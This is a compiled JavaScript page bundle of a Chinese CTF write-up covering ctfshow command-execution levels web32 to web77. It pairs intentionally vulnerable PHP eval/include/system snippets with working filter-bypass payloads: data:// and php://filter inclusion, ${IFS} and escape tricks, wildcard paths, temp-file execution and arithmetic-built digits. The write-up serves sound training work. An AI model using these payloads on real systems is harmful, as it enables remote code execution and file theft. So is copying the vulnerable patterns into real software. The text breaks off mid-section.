"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[131],{8453:(e,n,r)=>{r.d(n,{R:()=>c,x:()=>s});var a=r(6540);const l={},i=a.createContext(l);function c(e){const n=a.useContext(i);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function s(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:c(e.components),a.createElement(i.Provider,{value:n},e.children)}},9453:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>d,contentTitle:()=>s,default:()=>$,frontMatter:()=>c,metadata:()=>a,toc:()=>t});const a=JSON.parse('{"id":"CTF/CTFSHOW/ctfshow\u547d\u4ee4\u6267\u884c","title":"ctfshow\u547d\u4ee4\u6267\u884c","description":"\u547d\u4ee4\u6267\u884c","source":"@site/docs/CTF/CTFSHOW/ctfshow\u547d\u4ee4\u6267\u884c.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/ctfshow\u547d\u4ee4\u6267\u884c","permalink":"/docs/CTF/CTFSHOW/ctfshow\u547d\u4ee4\u6267\u884c","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/ctfshow\u547d\u4ee4\u6267\u884c.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"ctfshow\u53cd\u5e8f\u5217\u5316","permalink":"/docs/CTF/CTFSHOW/ctfshow\u53cd\u5e8f\u5217\u5316"},"next":{"title":"ctfshow\u6587\u4ef6\u4e0a\u4f20","permalink":"/docs/CTF/CTFSHOW/ctfshow\u6587\u4ef6\u4e0a\u4f20"}}');var l=r(4848),i=r(8453);const c={},s="ctfshow\u547d\u4ee4\u6267\u884c",d={},t=[{value:"\u547d\u4ee4\u6267\u884c",id:"\u547d\u4ee4\u6267\u884c",level:2},{value:"web32",id:"web32",level:3},{value:"web37",id:"web37",level:3},{value:"web38",id:"web38",level:3},{value:"web39",id:"web39",level:3},{value:"web40",id:"web40",level:3},{value:"web41",id:"web41",level:3},{value:"web42",id:"web42",level:3},{value:"web53",id:"web53",level:3},{value:"web55-56",id:"web55-56",level:3},{value:"web57",id:"web57",level:3},{value:"disable_functions",id:"disable_functions",level:2},{value:"web58",id:"web58",level:3},{value:"web59-65",id:"web59-65",level:3},{value:"web66-67",id:"web66-67",level:3},{value:"web68-70",id:"web68-70",level:3},{value:"web71",id:"web71",level:3},{value:"web72",id:"web72",level:3},{value:"web73",id:"web73",level:3},{value:"web74",id:"web74",level:3},{value:"web77",id:"web77",level:3}];function h(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",strong:"strong",...(0,i.R)(),...e.components};return(0,l.jsxs)(l.Fragment,{children:[(0,l.jsx)(n.header,{children:(0,l.jsx)(n.h1,{id:"ctfshow\u547d\u4ee4\u6267\u884c",children:"ctfshow\u547d\u4ee4\u6267\u884c"})}),"\n",(0,l.jsx)(n.h2,{id:"\u547d\u4ee4\u6267\u884c",children:"\u547d\u4ee4\u6267\u884c"}),"\n",(0,l.jsx)(n.p,{children:"\u53c2\u8003\u94fe\u63a5\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"http://t.csdnimg.cn/9jvpb",children:"CTFSHOW\u547d\u4ee4\u6267\u884c"})}),"\n",(0,l.jsx)(n.h3,{id:"web32",children:"web32"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){\r\n        eval($c);\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u53c2\u6570\u8fc7\u6ee4\u7684\u591a\uff0c\u5229\u7528\u6587\u4ef6\u5305\u542b"}),"\n",(0,l.jsxs)(n.p,{children:["include\u4e0d\u7528\u62ec\u53f7\uff0c\u5206\u53f7\u53ef\u4ee5\u7528?>\u4ee3\u66ff\uff0cphp\u6700\u540e\u4e00\u53e5\u4ee3\u7801\u4e0d\u9700\u8981",(0,l.jsx)(n.code,{children:"\u5206\u53f7"}),"\u3002"]}),"\n",(0,l.jsx)(n.p,{children:"payload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php\r\ninclude$_GET[1]?>&1=data://text/plain,<?php system('tac flag.php');?>\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web37",children:"web37"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag/i\", $c)){\r\n        include($c);\r\n        echo $flag;\r\n    }\r\n        \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u6709\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570\uff0c\u7528\u4f2a\u534f\u8bae"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"include //\u53ea\u751f\u6210\u8b66\u544a(E_WARNING)\uff0c\u5e76\u4e14\u811a\u672c\u4f1a\u7ee7\u7eed\r\nrequire //require \u4f1a\u751f\u6210\u81f4\u547d\u9519\u8bef(E_COMPILE_ERROR)\u5e76\u505c\u6b62\u811a\u672c\r\ninclude_once\r\nrequire_once \u7b49\n"})}),"\n",(0,l.jsx)(n.p,{children:"payload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"data://text/plain,<?php passthru('cat fl*');?>\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web38",children:"web38"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag|php|file/i\", $c)){\r\n        include($c);\r\n        echo $flag;\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u8fc7\u6ee4\u4e86",(0,l.jsx)(n.code,{children:"php"}),"\u5b57\u7b26\uff0c\u4f7f\u7528base64\u7f16\u7801\u5c31\u53ef\u4ee5\u4e86"]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"data://text/plain;base64,PD9waHAgcGFzc3RocnUoJ2NhdCBmbConKTs/Pg==\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"php\u77ed\u6807\u7b7e\r\n\u5f53\u8fc7\u6ee4\u4e86php\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06<?php ?> \u6362\u6210<?= ?>,\u4ee3\u8868<?php echo..?>\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"data://text/plain,<?= passthru('cat fl*');?>\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web39",children:"web39"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/flag/i\", $c)){\r\n        include($c.\".php\");\r\n    } \r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u7ee7\u7eed\u4f7f\u7528data\u534f\u8bae"}),"\n",(0,l.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"data://text/plain,<?php passthru('cat fl*');?>\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u524d\u9762\u7684php\u8bed\u53e5\u5df2\u7ecf\u95ed\u5408\uff0c\u6240\u4ee5\u540e\u9762\u7684",(0,l.jsx)(n.code,{children:".php"}),"\u4f1a\u88ab\u5f53\u4f5chtml\u8f93\u51fa\u5230\u9875\u9762"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231021223406535.png",alt:"image-20231021223406535"})}),"\n",(0,l.jsx)(n.h3,{id:"web40",children:"web40"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nif(isset($_GET['c'])){\r\n    $c = $_GET['c'];\r\n    if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\\uff08|\\\uff09|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\<|\\.|\\>|\\/|\\?|\\\\\\\\/i\", $c)){\r\n        eval($c);\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"get_defined_vars()\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u6240\u6709\u5df2\u5b9a\u4e49\u53d8\u91cf\u7684\u591a\u7ef4\u6570\u7ec4\u3002\u8fd9\u4e9b\u53d8\u91cf\u5305\u62ec\u73af\u5883\u53d8\u91cf\u3001\u670d\u52a1\u5668\u53d8\u91cf\u548c\u7528\u6237\u5b9a\u4e49\u7684\u53d8\u91cf\r\nnext()\u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u3002\r\narray_pop()\u51fd\u6570\u5220\u9664\u6570\u7ec4\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e76\u8fd4\u56de\u5176\u503c\r\narray_flip()\u51fd\u6570\u7528\u4e8e\u53cd\u8f6c/\u4ea4\u6362\u6570\u7ec4\u4e2d\u6240\u6709\u7684\u952e\u540d\u4ee5\u53ca\u5b83\u4eec\u5173\u8054\u7684\u952e\u503c\r\narray_rand()\u51fd\u6570\u8fd4\u56de\u6570\u7ec4\u4e2d\u7684\u968f\u673a\u952e\u540d\uff0c\u6216\u8005\u5982\u679c\u60a8\u89c4\u5b9a\u51fd\u6570\u8fd4\u56de\u4e0d\u53ea\u4e00\u4e2a\u952e\u540d\uff0c\u5219\u8fd4\u56de\u5305\u542b\u968f\u673a\u952e\u540d\u7684\u6570\u7ec4\r\ngetchwd() \u51fd\u6570\u8fd4\u56de\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002\r\nscandir() \u51fd\u6570\u8fd4\u56de\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u6570\u7ec4\u3002\r\ndirname() \u51fd\u6570\u8fd4\u56de\u8def\u5f84\u4e2d\u7684\u76ee\u5f55\u90e8\u5206\u3002\r\nchdir() \u51fd\u6570\u6539\u53d8\u5f53\u524d\u7684\u76ee\u5f55\u3002\r\nreadfile() \u8f93\u51fa\u4e00\u4e2a\u6587\u4ef6\u3002\r\ncurrent() \u8fd4\u56de\u6570\u7ec4\u4e2d\u7684\u5f53\u524d\u5355\u5143, \u9ed8\u8ba4\u53d6\u7b2c\u4e00\u4e2a\u503c\u3002\r\npos() current() \u7684\u522b\u540d\u3002\r\nnext() \u51fd\u6570\u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u3002\r\nend() \u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u3002\r\narray_rand() \u51fd\u6570\u8fd4\u56de\u6570\u7ec4\u4e2d\u7684\u968f\u673a\u952e\u540d\uff0c\u6216\u8005\u5982\u679c\u60a8\u89c4\u5b9a\u51fd\u6570\u8fd4\u56de\u4e0d\u53ea\u4e00\u4e2a\u952e\u540d\uff0c\u5219\u8fd4\u56de\u5305\u542b\u968f\u673a\u952e\u540d\u7684\u6570\u7ec4\u3002\r\narray_flip() array_flip() \u51fd\u6570\u7528\u4e8e\u53cd\u8f6c/\u4ea4\u6362\u6570\u7ec4\u4e2d\u6240\u6709\u7684\u952e\u540d\u4ee5\u53ca\u5b83\u4eec\u5173\u8054\u7684\u952e\u503c\u3002\r\narray_slice() \u51fd\u6570\u5728\u6570\u7ec4\u4e2d\u6839\u636e\u6761\u4ef6\u53d6\u51fa\u4e00\u6bb5\u503c\uff0c\u5e76\u8fd4\u56de\u3002\r\narray_reverse() \u51fd\u6570\u8fd4\u56de\u7ffb\u8f6c\u987a\u5e8f\u7684\u6570\u7ec4\u3002\r\nchr() \u51fd\u6570\u4ece\u6307\u5b9a\u7684 ASCII \u503c\u8fd4\u56de\u5b57\u7b26\u3002\r\nhex2bin() \u2014 \u8f6c\u6362\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u3002\r\ngetenv() \u83b7\u53d6\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u7684\u503c(\u57287.1\u4e4b\u540e\u53ef\u4ee5\u4e0d\u7ed9\u4e88\u53c2\u6570)\u3002\r\nlocaleconv() \u51fd\u6570\u8fd4\u56de\u4e00\u5305\u542b\u672c\u5730\u6570\u5b57\u53ca\u8d27\u5e01\u683c\u5f0f\u4fe1\u606f\u7684\u6570\u7ec4\u3002\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u4e2a\u9898\u4ed6\u8fc7\u6ee4\u7684\u662f\u4e2d\u6587\u62ec\u53f7\u4e0d\u662f\u82f1\u6587\u7684\u62ec\u53f7\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u51fd\u6570\u8fdb\u884c\u6267\u884c\u547d\u4ee4"}),"\n",(0,l.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"eval(array_rand(array_filp(next(get_defined_vars()))));\r\n//\u53ef\u4ee5\u7528print_r\u6253\u5370\u51fa\uff0c\u8fd4\u56de\u7684\u547d\u4ee4\r\nprint_r(array_pop(next(get_defined_vars())));\r\neval(array_pop(next(get_defined_vars())));\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web41",children:"web41"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nif(isset($_POST['c'])){\r\n    $c = $_POST['c'];\r\nif(!preg_match('/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i', $c)){\r\n        eval(\"echo($c);\");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\r\n?>\n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u6570\u5b57\uff0c\u5b57\u6bcd\u90fd\u88ab\u8fc7\u6ee4\u4e86\uff0c\u8fd8\u8fc7\u6ee4\u4e86",(0,l.jsx)(n.code,{children:"$ ^ + ~"}),"\u81ea\u589e\u5f02\u6216\u53d6\u53cd\u90fd\u4e0d\u80fd\u7528\uff0c\u4f46\u8fd9\u9898\u53ef\u4ee5\u7528\u6216"]}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.a,{href:"http://t.csdnimg.cn/WGbm5",children:"\u5927\u4f6c\u535a\u5ba2"}),"\uff0c\u76f4\u63a5\u7528\u5927\u4f6c\u7684\u811a\u672c"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231025115525656.png",alt:"image-20231025115525656"})}),"\n",(0,l.jsx)(n.h3,{id:"web42",children:"web42"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nif(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    system($c.\" >/dev/null 2>&1\");\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:">/dev/null \u9ed1\u6d1e,\u6240\u6709\u5185\u5bb9\u8f93\u5165\u5230\u8be5\u6587\u4ef6\u90fd\u4f1a\u4e22\u5931\u3002\n"})}),"\n",(0,l.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"cat flag.php;ls \u8ba9ls\u7684\u8f93\u51fa\u4e22\u5931\uff0c\u524d\u9762\u547d\u4ee4\u6b63\u5e38\u6267\u884c\r\ncat flag.php%0a \u8fdb\u884c\u622a\u65ad,%26,||\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web53",children:"web53"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\nif(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\r\n        echo($c);\r\n        $d = system($c);\r\n        echo \"<br>\".$d;\r\n    }else{\r\n        echo 'no';\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n} \n"})}),"\n",(0,l.jsxs)(n.p,{children:["\u4ed6\u6ca1\u6709\u8fc7\u6ee4",(0,l.jsx)(n.code,{children:"$"}),"\u53ef\u4ee5\u8fdb\u884c\u7a7a\u683c\u7ed5\u8fc7\uff0c\u867d\u7136\u5b83\u8fc7\u6ee4\u4e86\u5f88\u591a\u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u8f6c\u4e49\u7b26\u7ed5\u8fc7"]}),"\n",(0,l.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"ta\\c${IFS}fl\\ag.php\r\nta''c${IFS}fl''ag.php\r\nmv${IFS}fl\\ag.php${IFS}a\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web55-56",children:"web55-56"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"<?php\r\n// \u4f60\u4eec\u5728\u70ab\u6280\u5417\uff1f\r\nif(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    if(!preg_match(\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\>|\\</i\", $c)){\r\n        system($c);\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u8fc7\u6ee4\u4e86\u5927\u5c0f\u5199\u5b57\u6bcd\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u901a\u914d\u7b26\u4ee3\u66ff"}),"\n",(0,l.jsx)(n.p,{children:"\u59ff\u52bf\u4e00\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"\u5229\u7528bin\u76ee\u5f55"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://cloud.tencent.com/developer/article/2162724?from=15425",children:"bin\u76ee\u5f55\u77e5\u8bc6\u70b9"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"/bin/base64 flag.php \u5229\u7528base64\u8bfb\u53d6\u6587\u4ef6\r\npayload\uff1a\r\n/???/????64 ????.???\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u59ff\u52bf\u4e8c\uff1a"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html",children:"\u65e0\u5b57\u6bcd\u6570\u5b57webshell"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"http://blog.sina.com.cn/s/blog_af68a2c201016nh2.html",children:"linux\u4e0b\u7684.\u4f7f\u7528"})}),"\n",(0,l.jsx)(n.p,{children:".\u70b9\u7b26\u53f7\u53ef\u4ee5\u6267\u884csh\u547d\u4ee4\uff08\u4e0d\u9700\u8981\u6743\u9650\uff09"}),"\n",(0,l.jsx)(n.p,{children:"\u601d\u8def\uff1a"}),"\n",(0,l.jsxs)(n.p,{children:["\u6211\u4eec\u901a\u8fc7POST\u4e0a\u4f20\u4e34\u65f6\u6587\u4ef6\uff0c\u7136\u540e\u7528",(0,l.jsx)(n.code,{children:"."}),"\u6267\u884c\u4e34\u65f6\u6587\u4ef6\u7684\u547d\u4ee4\uff0c\u8fbe\u5230rce\u7684\u76ee\u7684"]}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u4e2a\u6587\u4ef6\u4e00\u822c\u5728linux\u91cc\u7684/tmp/php??????\uff0c\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u662f\u5927\u5199\uff0c\u5176\u4f59\u662f\u968f\u673a\u5927\u5c0f\u5199"}),"\n",(0,l.jsx)(n.p,{children:"POST\u4e0a\u4f20\u6587\u4ef6"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-html",children:'<!DOCTYPE html>\r\n<html lang="en">\r\n<head>\r\n    <meta charset="UTF-8">\r\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\r\n    <title>POST\u6570\u636e\u5305POC</title>\r\n</head>\r\n<body>\r\n<form action="http://8ae02e84-f005-4cd9-94e8-521eed9aebc6.challenge.ctf.show/" method="post" enctype="multipart/form-data">\r\n\x3c!--\u94fe\u63a5\u662f\u5f53\u524d\u6253\u5f00\u7684\u9898\u76ee\u94fe\u63a5--\x3e\r\n    <label for="file">\u6587\u4ef6\u540d\uff1a</label>\r\n    <input type="file" name="file" id="file"><br>\r\n    <input type="submit" name="submit" value="\u63d0\u4ea4">\r\n</form>\r\n</body>\r\n</html>\n'})}),"\n",(0,l.jsx)(n.p,{children:"\u6293\u5305\u4f20\u53c2"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"?c=.+/???/????????[@-[]\n"})}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"[@-[]"}),"\u662f\u6240\u6709\u5927\u5199\u5b57\u6bcd\uff0c\u770bascll\u7801\u8868"]}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231026125300228.png",alt:"image-20231026125300228"})}),"\n",(0,l.jsx)(n.p,{children:"\u6587\u4ef6\u5185\u5bb9\u662fsh\u547d\u4ee4"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-sh",children:"#!/bin/sh\r\ntac flag.php\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231026124849801.png",alt:"image-20231026124849801"})}),"\n",(0,l.jsx)(n.h3,{id:"web57",children:"web57"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'<?php\r\n//flag in 36.php\r\nif(isset($_GET[\'c\'])){\r\n    $c=$_GET[\'c\'];\r\n    if(!preg_match("/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\\'|\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\>|\\<|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i", $c)){\r\n        system("cat ".$c.".php");\r\n    }\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n'})}),"\n",(0,l.jsxs)(n.p,{children:["\u6784\u9020\u6570\u5b5736\u5c31\u884c\u4e86\uff0c\u5229\u7528\u4e86",(0,l.jsx)(n.code,{children:"$(( ))\u4e0e\u6574\u6570\u8fd0\u7b97"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"[root@localhost~]# echo $((1+1))\r\n2\r\n[root@localhost ~]# echo $(())\r\n0\r\n[root@localhost ~]# echo ~$(())\r\n~0\r\n[root@localhost ~]# echo $((~$(())))\r\n-1\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231105145852296.png",alt:"image-20231105145852296"})}),"\n",(0,l.jsx)(n.p,{children:"\u6211\u4eec\u8981\u6784\u902036\uff0c\u53ef\u4ee5\u5148\u8fdb\u884c\u9020-37"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"-37\r\n$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))\r\n36\r\n$((~$(($(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))))\r\n\u6709\u70b9\u773c\u82b1\n"})}),"\n",(0,l.jsx)(n.h2,{id:"disable_functions",children:"disable_functions"}),"\n",(0,l.jsx)(n.h3,{id:"web58",children:"web58"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"</php\r\n// \u4f60\u4eec\u5728\u70ab\u6280\u5417\uff1f\r\nif(isset($_POST['c'])){\r\n        $c= $_POST['c'];\r\n        eval($c);\r\n}else{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,l.jsx)(n.p,{children:"payload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"\u8bfb\u53d6\u6587\u4ef6\u8def\u5f84\r\nprint_r(scandir(dirname('__FILE__')));\r\nvar_dump(scandir('./'));\r\n$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString().\" \");} //glob\u534f\u8bae\r\n$a=opendir(\"./\"); while (($file = readdir($a)) !== false){echo $file . \"<br>\"; };\r\n$a=scandir('./');foreach($a as $value){echo $value.\" \";}\n"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\r\nshow_source("flag.php");\r\nhighlight_file("flag.php");\r\necho file_get_contents("flag.php");\r\nvar_dump(file("flag.php")); //file\u5c06\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u6570\u7ec4\n'})}),"\n",(0,l.jsx)(n.h3,{id:"web59-65",children:"web59-65"}),"\n",(0,l.jsx)(n.p,{children:"\u8fd9\u4e9b\u9898flag\u90fd\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\uff0c\u5148\u67e5\u770b\u6587\u4ef6\u8def\u5f84"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"print_r(scandir('./'));"})}),"\n",(0,l.jsx)(n.p,{children:"\u7136\u540e\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:'highlight_file("flag.php");'})}),"\n",(0,l.jsx)(n.h3,{id:"web66-67",children:"web66-67"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"var_dump(scandir('/'))"})}),"\n",(0,l.jsx)(n.p,{children:"\u53d1\u73b0flag\u5728\u6839\u76ee\u5f55\uff0cflag.txt"}),"\n",(0,l.jsx)(n.p,{children:"\u76f4\u63a5\u5305\u542b\u5c31\u884c\u4e86"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"//\u4e0b\u9762\u662fpayload\r\nc=include('/flag.txt');\r\nc=require('/flag.txt');\r\nc=require_once('/flag.txt');\r\nc=highlight_file('/flag.txt');\n"})}),"\n",(0,l.jsx)(n.h3,{id:"web68-70",children:"web68-70"}),"\n",(0,l.jsxs)(n.p,{children:[(0,l.jsx)(n.code,{children:"highlight_file()"}),"\u88ab\u7981\u4e86"]}),"\n",(0,l.jsx)(n.p,{children:"\u8fd8\u662f\u5148\u770b\u76ee\u5f55"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.code,{children:"$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString().\" 